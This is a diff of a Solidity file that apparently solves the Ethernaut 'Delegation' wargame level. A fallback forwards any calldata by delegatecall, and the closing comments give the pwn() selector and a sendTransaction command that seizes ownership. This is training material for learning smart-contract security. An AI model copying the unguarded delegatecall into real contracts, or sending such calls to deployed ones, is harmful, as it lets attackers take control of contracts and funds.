@@ -2,7 +2,6 @@
 pragma solidity ^0.8.0;
 
 contract Delegate {
-
   address public owner;
 
   constructor(address _owner) {
@@ -13,14 +12,12 @@ contract Delegate {
     owner = msg.sender;
   }
 
-  function getSignature() public pure returns(bytes memory){
-      return abi.encodeWithSignature("pwn()");
+  function getSignature() public pure returns (bytes memory) {
+    return abi.encodeWithSignature("pwn()");
   }
 }
 
-
 contract Delegation {
-
   address public owner;
   Delegate delegate;
 
@@ -30,16 +27,14 @@ contract Delegation {
   }
 
   fallback() external {
-    (bool result,) = address(delegate).delegatecall(msg.data);
+    (bool result, ) = address(delegate).delegatecall(msg.data);
     if (result) {
       this;
     }
   }
 
-  function test () public payable{
-      
-  }
+  function test() public payable {}
 }
 
-
-// 0xdd365b8b
+// data signature of the pwn() function 0xdd365b8b
+// await contract.sendTransaction({data: "0xdd365b8b"})
